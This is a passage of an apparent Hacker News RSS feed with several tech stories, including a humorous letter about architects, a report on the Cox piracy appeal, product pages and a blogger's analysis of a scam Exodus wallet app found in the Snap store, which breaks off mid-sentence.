href="https://www.bloomberg.com/news/features/2024-02-16/paramount-plus-struggles-leave-shari-redstone-exploring-sale?utm_campaign=bw&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:How Paramount Became a Cautionary Tale of the Streaming Wars;elm:context_link;itc:0;sec:content-canvas">How Paramount Became a Cautionary Tale of the Streaming Wars</a></p></li><li><p><a href="https://www.bloomberg.com/news/articles/2024-02-15/uber-profitability-comes-after-food-delivery-pandemic-investments?utm_campaign=bw&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:How Uber Beat the Skeptics and Became Profitable;elm:context_link;itc:0;sec:content-canvas">How Uber Beat the Skeptics and Became Profitable</a></p></li></ul><p>©2024 Bloomberg L.P.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[If Architects had to work like Programmers (341 pts)]]></title>
            <link>http://www.gksoft.com/a/fun/architects.html</link>
            <guid>39449424</guid>
            <pubDate>Wed, 21 Feb 2024 02:11:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="http://www.gksoft.com/a/fun/architects.html">http://www.gksoft.com/a/fun/architects.html</a>, See on <a href="https://news.ycombinator.com/item?id=39449424">Hacker News</a></p>
<div id="readability-page-1" class="page">



<p>
Dear Mr. Architect!

</p><p>
Please design and build me a house. I am not quite sure of what I need, so
you should use your discretion. My house should have between two and
forty-five bedrooms. Just make sure the plans are such that the bedrooms
can be easily added or deleted. When you bring the blueprints to me, I
will make the final decision of what I want. Also, bring me the cost
breakdown for each configuration so that I can arbitrarily pick one.

</p><p>
Keep in mind that the house I ultimately choose must cost less than the
one I am currently living in. Make sure, however, that you correct all the
deficiencies that exist in my current house (the floor of my kitchen
vibrates when I walk across it, and the walls don't have nearly enough
insulation in them).

</p><p>
As you design, also keep in mind that I want to keep yearly maintenance
costs as low as possible. This should mean the incorporation of extra-cost
features like aluminium, vinyl, or composite siding. (If you choose not
to specify aluminium, be prepared to explain your decision in detail.)

</p><p>
Please take care that modern design practices and the latest materials are
used in construction of the house, as I want it to be a showplace for the
most up-to-date ideas and methods. Be alerted, however, that kitchen
should be designed to accommodate, among other things, my 1952 Gibson
refrigerator.

</p><p>
To insure that you are building the correct house for our entire family,
make certain that you contact each of our children, and also our in-laws.
My mother-in-law will have very strong feelings about how the house should
be designed, since she visits us at least once a year. Make sure that you
weigh all of these options carefully and come to the right decision. I,
however, retain the right to overrule any choices that you make.

</p><p>
Please don't bother me with small details right now. Your job is to
develop the overall plans for the house: get the big picture. At this
time, for example, it is not appropriate to be choosing the color of the
carpet. However, keep in mind that my wife likes blue.

</p><p>
Also, do not worry at this time about acquiring the resources to build the
house itself. Your first priority is to develop detailed plans and
specifications. Once I approve these plans, however, I would expect the
house to be under roof within 48 hours.

</p><p>
While you are designing this house specifically for me, keep in mind that
sooner or later I will have to sell it to someone else. It therefore
should have appeal to a wide variety of potential buyers. Please make sure
before you finalize the plans that there is a consensus of the population
in my area that they like the features this house has.

</p><p>
Please prepare a complete set of blueprints. It is not necessary at this
time to do the real design, since they will be used only for construction
bids. Be advised, however, that you will be held accountable for any
increase of construction costs as a result of later design changes.

</p><p>
You must be thrilled to be working on an interesting project as this! To
be able to use the latest techniques and materials and to be given such
freedom in your designs is something that can't happen very often. Contact
me as soon as possible with your complete ideas and plans.

</p><p>
P.S.: <br>
My wife has just told me that she disagrees with many of the instructions
I've given you in this letter. As architect, it is your responsibility to
resolve these differences. I have tried in the past and have been unable
to accomplish this. If you can't handle this responsibility, I will have
to find another architect.

</p><p>
P.P.S.: <br>
Perhaps what I need is not a house at all, but a travel trailer. Please
advise me as soon as possible if this is the case.

</p><hr size="5">

<hr size="5">

<p>
letzte Änderung: 1997-06-11 --
<a href="http://www.gksoft.com/a/">Gunnar Anzinger </a>
<a href="mailto:a@gksoft.com">&lt;a@gksoft.com&gt;</a>





</p></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Court blocks $1B copyright ruling that punished ISP for its users' piracy (154 pts)]]></title>
            <link>https://arstechnica.com/tech-policy/2024/02/court-blocks-1-billion-copyright-ruling-that-punished-isp-for-its-users-piracy/</link>
            <guid>39448223</guid>
            <pubDate>Tue, 20 Feb 2024 23:13:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arstechnica.com/tech-policy/2024/02/court-blocks-1-billion-copyright-ruling-that-punished-isp-for-its-users-piracy/">https://arstechnica.com/tech-policy/2024/02/court-blocks-1-billion-copyright-ruling-that-punished-isp-for-its-users-piracy/</a>, See on <a href="https://news.ycombinator.com/item?id=39448223">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="articleBody">
                                    
<figure>
  <img src="https://cdn.arstechnica.net/wp-content/uploads/2024/02/music-pirate-800x553.jpg" alt="A man, surrounded by music CDs, uses a laptop while wearing a skull-and-crossbones pirate hat and holding one of the CDs in his mouth.">
      <figcaption><p>Getty Images | OcusFocus</p></figcaption>  </figure>

  




<!-- cache hit 84:single/related:8bb859f00a9c6cb7bad18f6b4f157de5 --><!-- empty -->
<p>A federal appeals court today overturned a $1 billion piracy <a href="https://arstechnica.com/tech-policy/2019/12/cox-communications-hit-with-1-billion-verdict-over-music-piracy/">verdict</a> that a jury handed down against cable Internet service provider Cox Communications in 2019. Judges rejected Sony's claim that Cox profited directly from copyright infringement committed by users of Cox's cable broadband network.</p>
<p>Appeals court judges didn't let Cox off the hook entirely, but they vacated the damages award and ordered a new damages trial, which will presumably result in a significantly smaller amount to be paid to Sony and other copyright holders. Universal and Warner are also plaintiffs in the case.</p>
<p>"We affirm the jury's finding of willful contributory infringement," said a <a href="https://storage.courtlistener.com/recap/gov.uscourts.ca4.161920/gov.uscourts.ca4.161920.92.0.pdf">unanimous decision</a> by a three-judge panel at the US Court of Appeals for the 4th Circuit. "But we reverse the vicarious liability verdict and remand for a new trial on damages because Cox did not profit from its subscribers' acts of infringement, a legal prerequisite for vicarious liability."</p>
<p>If the correct legal standard had been used in the district court, "no reasonable jury could find that Cox received a direct financial benefit from its subscribers' infringement of Plaintiffs' copyrights," judges wrote.</p>
<p>The case began when Sony and other music copyright holders sued Cox, claiming that it didn't adequately fight piracy on its network and failed to terminate repeat infringers. A US District Court jury in the Eastern District of Virginia found the ISP liable for infringement of 10,017 copyrighted works.</p>                                            
                                                        
<h2>Copyright owners want ISPs to disconnect users</h2>
<p>Cox's appeal was <a href="https://arstechnica.com/tech-policy/2021/06/1-billion-piracy-ruling-could-force-isps-to-disconnect-more-internet-users/">supported by advocacy groups</a> concerned that the big-money judgment could force ISPs to disconnect more Internet users based merely on accusations of copyright infringement. Groups such as the Electronic Frontier Foundation also called the ruling legally flawed.</p>
<p>"When these music companies sued Cox Communications, an ISP, the court got the law wrong," the <a href="https://www.eff.org/deeplinks/2021/06/if-not-overturned-bad-copyright-decision-will-lead-many-americans-lose-internet">EFF wrote in 2021</a>. "It effectively decided that the only way for an ISP to avoid being liable for infringement by its users is to terminate a household or business's account after a small number of accusations—perhaps only two. The court also allowed a damages formula that can lead to nearly unlimited damages, with no relationship to any actual harm suffered. If not overturned, this decision will lead to an untold number of people losing vital Internet access as ISPs start to cut off more and more customers to avoid massive damages."</p>
<p>In today's 4th Circuit ruling, appeals court judges wrote that "Sony failed, as a matter of law, to prove that Cox profits directly from its subscribers' copyright infringement."</p>
<p>A defendant may be vicariously liable for a third party's copyright infringement if it profits directly from it and is in a position to supervise the infringer, the ruling said. Cox argued that it doesn't profit directly from infringement because it receives the same monthly fee from subscribers whether they illegally download copyrighted files or not, the ruling noted.</p>
<p>The question in this type of case is whether there is a causal relationship between the infringement and the financial benefit. "If copyright infringement draws customers to the defendant's service or incentivizes them to pay more for their service, that financial benefit may be profit from infringement. But in every case, the financial benefit to the defendant must flow directly from the third party's acts of infringement to establish vicarious liability," the court said.</p>

                                                </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Video Game Module for Flipper Zero (110 pts)]]></title>
            <link>https://shop.flipperzero.one/products/video-game-module-for-flipper-zero</link>
            <guid>39448154</guid>
            <pubDate>Tue, 20 Feb 2024 23:05:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://shop.flipperzero.one/products/video-game-module-for-flipper-zero">https://shop.flipperzero.one/products/video-game-module-for-flipper-zero</a>, See on <a href="https://news.ycombinator.com/item?id=39448154">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p>The Video Game Module (Powered by Raspberry Pi) brings new entertainment and development opportunities to your Flipper Zero:</p>
<br>
</div><div>
<ul>
<li>
<strong>Raspberry Pi RP2040 Microcontroller</strong>: <span data-mce-fragment="1">compatible with lots of existing Raspberry Pi Pico projects; allows&nbsp;you to use the module as a standalone device</span>
</li>
<li>
<strong>Video Out</strong>: see the Flipper Zero screen&nbsp;on your TV</li>
<li>
<strong>Motion Sensor</strong>: built-in gyroscope and accelerometer with open API. Allows you to add motion input to any app or game</li>
<li>
<strong>GPIO Port</strong>: a 14-pin port for plugging in joysticks, sensors, and&nbsp;any other DIY components</li>
<li>
<strong>USB-C Port</strong>: dedicated USB port connected directly to&nbsp;the RP2040 allows&nbsp;you to communicate with PC or&nbsp;flash any firmware without Flipper Zero</li>
<li>
<strong>Standalone Mode</strong>: use the module without Flipper Zero by running any alternative firmware compatible with Raspberry Pi Pico</li>
<li>
<strong>Open-Source Firmware and Schematics</strong>:&nbsp;explore and customize&nbsp;any parts of the module, both software and hardware</li>
</ul>
<p>Read <a href="https://blog.flipper.net/introducing-video-game-module-powered-by-raspberry-pi/" target="_blank">the announcement in our blog</a> to learn more about the Video Game Module.<br></p>
</div><p>Flipper Zero not included. Shown for reference only.</p></div>]]></description>
        </item>
        <item>
            <title><![CDATA[YouTube's search function is atrocious now [video] (118 pts)]]></title>
            <link>https://www.youtube.com/watch?v=Z3dSkkEr-wk</link>
            <guid>39448021</guid>
            <pubDate>Tue, 20 Feb 2024 22:49:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.youtube.com/watch?v=Z3dSkkEr-wk">https://www.youtube.com/watch?v=Z3dSkkEr-wk</a>, See on <a href="https://news.ycombinator.com/item?id=39448021">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Kagi Sidekick (alpha) (612 pts)]]></title>
            <link>https://sidekick.kagi.com/</link>
            <guid>39447041</guid>
            <pubDate>Tue, 20 Feb 2024 21:18:20 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://sidekick.kagi.com/">https://sidekick.kagi.com/</a>, See on <a href="https://news.ycombinator.com/item?id=39447041">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <div>
          <div>
            <h2>
              Kagi Sidekick (alpha)
            </h2>
            <p>
              Add fast search with Kagi smarts and AI to your personal or documentation website with just a couple lines of code.
            </p>
            <p>
              We'll sort out the hard stuff - indexing, embeddings, vector search, and AI chat with your pages. Just integrate with two lines
              of code using our lightweight Web Components (20kB min+gzip) or our Docusaurus, Hugo, or VitePress plugins.
            </p>
            <p>
              See demo in Kagi's own documentation at
              <a href="https://help.kagi.com/kagi/">help.kagi.com</a>
            </p>
          </div>
          <p><img src="https://sidekick.kagi.com/doggo.svg" alt="doggo image">
          </p>
        </div>
        <iframe width="720" height="405" src="https://www.youtube-nocookie.com/embed/PcQI6z-hXq8?si=ddJqbzc9RNZG7J1R&amp;rel=0" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe>

        <div>
         
            <h3>What is the big idea?</h3>
            <div><p>
              We intend to offer Sidekick as a free service for small/personal websites and reasonably priced search option for commercial websites. The added benefit of using Kagi Sidekick is that your website will automatically (after opt-in) be indexed to show in Kagi search. </p><p>
              We are currently in the process of gauging demand for this service. Please <a href="https://forms.gle/tiQVHpg7K2FBaK1w5">register your interest</a> and we'll notify you when it launches. You can also submit feedback in the <a href="https://kagifeedback.org/d/3123-kagi-sidekick">Sidekick discussion thread</a>.
            </p></div>
            
         </div>

        <p><span id="submit-text">h</span>
        </p>

        <p>
            Follow <a href="https://twitter.com/KagiHQ">@KagiHQ</a> for
            updates or join our
            <a href="https://kagi.com/discord">Discord</a> to discuss
           
          </p>
      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Warning: $14k BigQuery charge in 2 hours (183 pts)]]></title>
            <link>https://discuss.httparchive.org/t/warning-14-000-bigquery-charge-in-2-hours/2715</link>
            <guid>39446789</guid>
            <pubDate>Tue, 20 Feb 2024 20:56:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://discuss.httparchive.org/t/warning-14-000-bigquery-charge-in-2-hours/2715">https://discuss.httparchive.org/t/warning-14-000-bigquery-charge-in-2-hours/2715</a>, See on <a href="https://news.ycombinator.com/item?id=39446789">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="post_1">
            <div>
              


              <p><span>
                  <time datetime="2024-02-20T20:53:30Z">
                    February 20, 2024,  8:53pm
                  </time>
                  <meta itemprop="dateModified" content="2024-02-20T20:53:30Z">
              <span itemprop="position">1</span>
              </span>
            </p></div>
            <div itemprop="text">
              <p>This website makes it seem like this “public” dataset is for the community to use, but it is instead a for-profit money maker for Google Cloud and you can lose tens of thousands of dollars.</p>
<p>Last week I ran a script on BigQuery for historical HTTP Archive data and was billed $14,000 by Google Cloud with zero warning whatsoever, and they won’t remove the fee.</p>
<p>This official website should be updated to warn people Google is apparently now hosting this dataset to make money.  I don’t think that was the original mission, but that’s what it is today, there’s basically zero customer support, and you can lose $14k in the blink of an eye.</p>
<p>Academics, especially grad students, need to be aware of this before they give a credit card number to Google.  In fact, I’d caution against using this dataset whatsoever with this new business model attached.</p>
            </div>

            

            

          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Exodus Bitcoin Wallet: $490k swindle (203 pts)]]></title>
            <link>https://popey.com/blog/2024/02/exodus-bitcoin-wallet-490k-swindle/</link>
            <guid>39446617</guid>
            <pubDate>Tue, 20 Feb 2024 20:41:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://popey.com/blog/2024/02/exodus-bitcoin-wallet-490k-swindle/">https://popey.com/blog/2024/02/exodus-bitcoin-wallet-490k-swindle/</a>, See on <a href="https://news.ycombinator.com/item?id=39446617">Hacker News</a></p>
<div id="readability-page-1" class="page"><div role="main"><article role="main"><p><strong>tl;dr</strong>: A Bitcoin investor was recently scammed out of 9 Bitcoin (worth around $490K) in a fake “Exodus wallet” desktop application for Linux, published in the Canonical Snap Store. This isn’t the first time, and if nothing changes, it likely won’t be the last.</p><p><a href="https://www.walletexplorer.com/wallet/32394c8892f2076c"><img src="https://popey.com/blog/images/2024-02-20/byebyebitcoin50.png" alt="Bye bye bitcoin"></a></p><p><em>This post turned out longer than I expected. So if you don’t have the time there’s a briefer summary at the bottom under “In summary (the tl;dr)” along with my suggestions on what Canonical should do now.</em></p><p>We talked about this in <a href="https://linuxmatters.sh/23/">episode 23</a> of <a href="https://linuxmatters.sh/">Linux Matters Podcast</a>, if you prefer a truncated audio version. The episode was recorded on 13th February 2024, and published on 20th February whereas this blog post is current as of the publication date.</p><p><a href="https://linuxmatters.sh/23/"><img src="https://popey.com/blog/images/2024-02-20/linuxmatters-banner-3000x750_30.png" alt="Scam exodus app"></a></p><p><em>Patreon <a href="https://linuxmatters.sh/support">supporters</a> of <a href="https://linuxmatters.sh/">Linux Matters</a> can get the show a day early, and without adverts.</em> 🙏</p><h2 id="introduction">Introduction</h2><p>For clarity, I used to work for Canonical on the Snapcraft team, but I no longer do. Now, I’m just some community guy who wants Ubuntu and Snapcraft to be a success. I’m writing this in the hope Canonical will fix its processes so reputation-damaging events like this don’t keep happening.</p><p>All of the words below are based on my external perspective of what happened. However, I have also drawn on my historic internal knowledge of the processes and how we dealt with this in the past. Though things may have changed in the two years since I left the company.</p><h2 id="what-happened">What happened</h2><p>An application called “Exodus” was published in the Canonical Snap store on 6th February 2024. (<em>In the <a href="https://linuxmatters.sh/23/">podcast episode</a>, I mistakenly said the application had been published for 2 days. This is inaccurate. It was published for 6 days)</em>.</p><p>The application had a couple of screenshots, an icon, and a detailed description.</p><p><a href="https://popey.com/blog/images/2024-02-20/Screenshot_12-2-2024_192925_snapcraft.io_crop_100.jpeg"><img src="https://popey.com/blog/images/2024-02-20/Screenshot_12-2-2024_192925_snapcraft.io_crop_50.jpeg" alt="Exodus in the Snap store"></a></p><p>Early on Sunday 12th February a new <a href="https://forum.snapcraft.io/">Snapcraft forum</a> user named “castle” <a href="https://forum.snapcraft.io/t/exodus-movement-exod/38904">started</a> a short thread titled “<a href="https://forum.snapcraft.io/t/exodus-movement-exod/38904">Exodus - Movement Exod</a>”. In it, they enquired:</p><blockquote><p>Can anyone tell if the Exodus wallet in Ubuntu’s software store is a scam? My wallet is empty after recovering and it shows a recent transaction of my entire balance sent to an address. I never made this transaction.</p></blockquote><p>I initially spotted this question early on that Sunday evening, some nine or ten hours after it was posted.</p><p><strong>Spoiler:</strong> <em>This “Exodus” application published in the Snap store was indeed a scam application. There is a genuine <a href="https://www.exodus.com/">organisation</a> that developed a real, seemingly ’legitimate’ cryptocurrency wallet application. This is not that.</em></p><h2 id="brief-analysis">Brief analysis</h2><p>Without wishing to give scammers a “<em>How to pass for a genuine application</em>” guide, I’ve taken a look at this one and present the details here so users are empowered to make educated decisions.</p><h3 id="store-page">Store page</h3><p>The “Exodus” application was published in the Snap store at <a href="https://snapcraft.io/exodus">https://snapcraft.io/exodus</a> but has subsequently been ‘quarantined’ by Canonical.</p><p><em>When a snap is ‘quarantined’, typically the owner’s account is disabled, their published snaps are moved to a Canonical-owned account, and the published revisions are ‘unpublished’. The net result is the application no longer appears in search results, visiting the store page returns a ‘404’, and the publisher can no longer access the package.</em></p><p>Below is a screen capture of the full Exodus Snap store page I took at the time.</p><p><a href="https://popey.com/blog/images/2024-02-20/Screenshot_12-2-2024_192925_snapcraft.io_100.jpeg"><img src="https://popey.com/blog/images/2024-02-20/Screenshot_12-2-2024_192925_snapcraft.io_50.jpeg" alt="Exodus in the Snap store"></a></p><p>The store page looks somewhat legitimate, to the untrained eye. The publisher’s name was “Movement Exod (movementexod)”, which also adds <em>some</em> legitimacy. It was published in the “Finance” category in the store.</p><p>The logo and screenshots are from the official upstream Exodus application. A lengthy text description provides some simple marketing about the platform.</p><p>Note the coloured map at the bottom of the page has multiple countries highlighted. This indicates the snap had (at the time of screenshot) at least ten installs in different countries. Therefore, our user is <strong>not</strong> the only person with this malware installed on their PC.</p><p>The application could also be viewed in the desktop “App Centre” (previously “Ubuntu Software”, a.k.a. “GNOME Software”) application storefront.</p><p><a href="https://popey.com/blog/images/2024-02-20/gnome-software_100.png"><img src="https://popey.com/blog/images/2024-02-20/gnome-software_50.png" alt="Exodus in the Ubuntu Store"></a></p><p>Interestingly we learned via their <a href="https://forum.snapcraft.io/t/exodus-movement-exod/38904/6">responses</a> that the desktop GUI was likely the way the “castle” user installed the Exodus application on their system. That’s pertinent given a later response where they ask why the snap is presented as “Safe” in the storefront. They likely saw a button like this in the “App Centre”, which gave them some confidence in the application.</p><p><a href="https://popey.com/blog/images/2024-02-20/safe.png"><img src="https://popey.com/blog/images/2024-02-20/safe.png" alt="Exodus in the Snap store"></a></p><p>Furthermore the title of the Snapcraft web frontend says “<em>Snaps are containerised software packages that are simple to create and install. They auto-update and are safe to run.</em>”</p><p><a href="https://popey.com/blog/images/2024-02-20/safe-to-run_100.png"><img src="https://popey.com/blog/images/2024-02-20/safe-to-run_100.png" alt="Snapcraft title"></a></p><p><em>Are they though?</em></p><h3 id="a-peek-inside">A peek inside</h3><p>I wanted to take a look at the application itself. So on my workstation, in a separate virtual machine, I ran <code>snap download exodus</code> to download, but not install the application. I don’t have any cryptocurrency wallets on my system, but I didn’t know what the application might try to do, so for safety I didn’t run it directly on my computer.</p><p><em>A snap is just a squashfs file, typically containing an application, libraries, assets and metadata.</em></p><div><pre tabindex="0"><code data-lang="bash"><span><span>alan@vm:~/temp$ file exodus_4.snap 
</span></span><span><span>exodus_4.snap: Squashfs filesystem, little endian, version 4.0, xz compressed, 
</span></span><span><span>    <span>26962719</span> bytes, <span>110</span> inodes, blocksize: <span>131072</span> bytes, created: Fri Feb  <span>9</span> 10:50:58 <span>2024</span>
</span></span></code></pre></div><p>I unpacked the snap with <code>unsquashfs</code> and briefly poked around at the resulting files.</p><div><pre tabindex="0"><code data-lang="bash"><span><span>alan@vm:~/temp$ unsquashfs exodus_4.snap 
</span></span><span><span>Parallel unsquashfs: Using <span>8</span> processors
</span></span><span><span><span>79</span> inodes <span>(</span><span>788</span> blocks<span>)</span> to write        
</span></span><span><span>                                                           
</span></span><span><span><span>[=========================================================================</span>/<span>]</span> 867/867 100%
</span></span><span><span>                                                           
</span></span><span><span>created <span>79</span> files                       
</span></span><span><span>created <span>31</span> directories
</span></span><span><span>created <span>0</span> symlinks    
</span></span><span><span>created <span>0</span> devices                
</span></span><span><span>created <span>0</span> fifos                        
</span></span><span><span>created <span>0</span> sockets
</span></span><span><span>created <span>0</span> hardlinks
</span></span></code></pre></div><p>Notably much of the metadata in the <code>snap.yaml</code> file was still the developer defaults such as “Single-line elevator pitch for your amazing snap”.</p><div><pre tabindex="0"><code data-lang="yaml"><span><span><span>alan@vm:~/temp$ cat squashfs-root/meta/snap.yaml </span>
</span></span><span><span><span>name</span>: <span>exodus</span>
</span></span><span><span><span>version</span>: <span>1.0.0</span>
</span></span><span><span><span>summary</span>: <span>Single-line elevator pitch for your amazing snap</span>
</span></span><span><span><span>description</span>: |<span>
</span></span></span><span><span><span>  This is my-snap's description. You have a paragraph or two to tell the
</span></span></span><span><span><span>  most important story about your snap. Keep it under 100 words though,
</span></span></span><span><span><span>  we live in tweetspace and your description wants to look good in the snap
</span></span></span><span><span><span>  store.</span>  
</span></span><span><span><span>apps</span>:
</span></span><span><span>  <span>exodus</span>:
</span></span><span><span>    <span>command</span>: <span>snap/command-chain/desktop-launch $SNAP/bin/exodus</span>
</span></span><span><span>    <span>plugs</span>:
</span></span><span><span>    - <span>desktop</span>
</span></span><span><span>    - <span>desktop-legacy</span>
</span></span><span><span>    - <span>gsettings</span>
</span></span><span><span>    - <span>opengl</span>
</span></span><span><span>    - <span>wayland</span>
</span></span><span><span>    - <span>x11</span>
</span></span><span><span>    - <span>network</span>
</span></span><span><span>    - <span>home</span>
</span></span><span><span>    <span>command-chain</span>:
</span></span><span><span>    - <span>snap/command-chain/snapcraft-runner</span>
</span></span><span><span>    - <span>snap/command-chain/desktop-launch</span>
</span></span></code></pre></div><p>Further investigation revealed this was an application developed using <a href="https://flutter.dev/">Flutter</a>.</p><div><pre tabindex="0"><code data-lang="bash"><span><span>alan@vm:~/temp$ ldd squashfs-root/bin/exodus | grep flutter
</span></span><span><span>        libflutter_linux_gtk.so 
</span></span><span><span>            <span>=</span>&gt; /home/alan/temp/squashfs-root/bin/lib/libflutter_linux_gtk.so <span>(</span>0x00007f69ee800000<span>)</span>
</span></span></code></pre></div><p>The application binary was quite small, and there weren’t a lot of bundled libraries beyond the essentials, potentially indicating limited features.</p><div><pre tabindex="0"><code data-lang="bash"><span><span>alan@vm:~/temp$ ls -lh squashfs-root/bin/exodus
</span></span><span><span>-rwxr-xr-x <span>1</span> alan alan 24K Feb  <span>9</span> 10:49 squashfs-root/bin/exodus
</span></span></code></pre></div><h2 id="genuine-or-not-tho">Genuine or not tho?</h2><p><em>Some software vendors link directly to the Snap store page for their software packages - others do not.</em></p><p>I looked on the upstream <a href="https://www.exodus.com/">Exodus website</a> to see if there was any mention of the snap.</p><p><a href="https://popey.com/blog/images/2024-02-20/exodus-website.png"><img src="https://popey.com/blog/images/2024-02-20/exodus-website.png" alt="Official Exodus electron app"></a></p><p>Notably the snapped application was neither linked nor even mentioned. There are deb and zip files for a Linux build of their Exodus Wallet application, though.</p><p>I downloaded and unpacked these and observed significant differences to the application in the Snap store. The official app isn’t Flutter-based, it’s built using <a href="https://www.electronjs.org/">Electron</a>, which bundles a Chromium-based runtime.</p><div><pre tabindex="0"><code data-lang="bash"><span><span>alan@vm:~/temp/upstream$ unzip -qq exodus-linux-x64-24.2.12.zip 
</span></span><span><span>alan@vm:~/temp/upstream$ ll Exodus-linux-x64/
</span></span><span><span>total <span>217800</span>
</span></span><span><span>drwxr-xr-x <span>4</span> alan alan      <span>4096</span> Feb  <span>8</span> 18:02 ./
</span></span><span><span>drwxrwxr-x <span>3</span> alan alan      <span>4096</span> Feb <span>20</span> 10:04 ../
</span></span><span><span>-rw-r--r-- <span>1</span> alan alan    <span>136037</span> Feb  <span>8</span> 18:02 chrome_100_percent.pak
</span></span><span><span>-rw-r--r-- <span>1</span> alan alan    <span>196924</span> Feb  <span>8</span> 18:02 chrome_200_percent.pak
</span></span><span><span>-rwxr-xr-x <span>1</span> alan alan   <span>1322280</span> Feb  <span>8</span> 18:02 chrome_crashpad_handler*
</span></span><span><span>-rwxr-xr-x <span>1</span> alan alan     <span>54096</span> Feb  <span>8</span> 18:02 chrome-sandbox*
</span></span><span><span>-rwxr-xr-x <span>1</span> alan alan <span>173385472</span> Feb  <span>8</span> 18:02 Exodus*
</span></span><span><span>-rwxr-xr-x <span>1</span> alan alan       <span>271</span> Feb  <span>8</span> 18:02 exodus.desktop*
</span></span><span><span>-rw-r--r-- <span>1</span> alan alan  <span>10717392</span> Feb  <span>8</span> 18:02 icudtl.dat
</span></span><span><span>-rwxr-xr-x <span>1</span> alan alan       <span>610</span> Feb  <span>8</span> 18:02 install-desktop-file.sh*
</span></span><span><span>-rwxr-xr-x <span>1</span> alan alan    <span>252120</span> Feb  <span>8</span> 18:02 libEGL.so*
</span></span><span><span>-rwxr-xr-x <span>1</span> alan alan   <span>2882824</span> Feb  <span>8</span> 18:02 libffmpeg.so*
</span></span><span><span>-rwxr-xr-x <span>1</span> alan alan   <span>6613816</span> Feb  <span>8</span> 18:02 libGLESv2.so*
</span></span><span><span>-rwxr-xr-x <span>1</span> alan alan   <span>4292368</span> Feb  <span>8</span> 18:02 libvk_swiftshader.so*
</span></span><span><span>-rwxr-xr-x <span>1</span> alan alan   <span>7469008</span> Feb  <span>8</span> 18:02 libvulkan.so.1*
</span></span><span><span>-rw-r--r-- <span>1</span> alan alan      <span>1096</span> Feb  <span>8</span> 18:02 LICENSE
</span></span><span><span>-rw-r--r-- <span>1</span> alan alan   <span>9242930</span> Feb  <span>8</span> 18:02 LICENSES.chromium.html
</span></span><span><span>drwxr-xr-x <span>2</span> alan alan      <span>4096</span> Feb  <span>8</span> 18:02 locales/
</span></span><span><span>drwxr-xr-x <span>2</span> alan alan      <span>4096</span> Feb  <span>8</span> 18:02 resources/
</span></span><span><span>-rw-r--r-- <span>1</span> alan alan   <span>5499616</span> Feb  <span>8</span> 18:02 resources.pak
</span></span><span><span>-rw-r--r-- <span>1</span> alan alan    <span>267462</span> Feb  <span>8</span> 18:02 snapshot_blob.bin
</span></span><span><span>-rw-r--r-- <span>1</span> alan alan    <span>626313</span> Feb  <span>8</span> 18:02 v8_context_snapshot.bin
</span></span><span><span>-rw-r--r-- <span>1</span> alan alan         <span>6</span> Feb  <span>8</span> 18:02 version
</span></span><span><span>-rw-r--r-- <span>1</span> alan alan       <span>107</span> Feb  <span>8</span> 18:02 vk_swiftshader_icd.json
</span></span></code></pre></div><p>I initially <a href="https://forum.snapcraft.io/t/exodus-movement-exod/38904/2">replied</a> to the thread, letting the user know this looked dodgy, and certainly not official. The first revision of my reply:</p><blockquote><p>It certainly doesn’t look official to me, based on the following simple check:</p><ul><li>The upstream Exodus app is available as a deb and zip. Inside those packages there’s an electron app.</li><li>The exodus snap is a flutter application, not built using electron.</li></ul><p>So it could be someone making their own Exodus application, it doesn’t look official.</p></blockquote><h2 id="digging-deeper">Digging deeper</h2><p>I wondered what the application did though. So I spun up a <a href="https://github.com/quickemu-project/quickemu">Quickemu</a> virtual machine running Ubuntu 22.04 then installed and ran the snap.</p><p><code>sudo snap install exodus_4.snap --dangerous</code></p><p>Once launched, the dodgy Exodus app shows a window containing a branded background overlayed with input fields and buttons.</p><p><a href="https://popey.com/blog/images/2024-02-20/scam-exodus-app-1.png"><img src="https://popey.com/blog/images/2024-02-20/scam-exodus-app-1_70.png" alt="Scam exodus app"></a></p><p>Clicking the help icon reveals the very brief documentation. The user is expected to input their twelve-word recovery phrase, to “import” their Exodus wallet.</p><p><a href="https://popey.com/blog/images/2024-02-20/scam-exodus-app-2.png"><img src="https://popey.com/blog/images/2024-02-20/scam-exodus-app-2_70.png" alt="Scam exodus app"></a></p><p>“You need to write your 12-words phrase to import wallet. If your wallet is not imported, it means it is either not created or you are entering incorrect data. Before you click the import wallet button, <strong>double-check the entered phrase</strong>”</p><h3 id="danger-zone">Danger Zone</h3><p><strong>It’s mentioned in bold on the upstream Exodus site, and their subreddit, that users should never enter their twelve-word wallet recovery phrase, and that Exodus will never ask for this information.</strong></p><p><a href="https://popey.com/blog/images/2024-02-20/never-1.png"><img src="https://popey.com/blog/images/2024-02-20/never-1_45.png" alt="Never 1"></a></p><p>“❗ Exodus Staff will NEVER ask for sensitive information, including passwords, 12-word phrases or private keys.”</p><p><a href="https://popey.com/blog/images/2024-02-20/never-2.png"><img src="https://popey.com/blog/images/2024-02-20/never-2_45.png" alt="Never 1"></a></p><p>“Exodus will never ask you for your 12-word (secret) phrase. Exodus will never as for your password. Exodus will never ask you to visit a link except for our official website at <a href="https://www.exodus.com/">www.Exodus.com</a>”</p><h2 id="get-lost-fat-wallet-httpswwwyoutubecomwatchvyapx6miryyy">Get lost, fat wallet <a href="https://www.youtube.com/watch?v=yApx6MirYyY">🔗</a></h2><p>With that warning noted, I typed nonsense in the 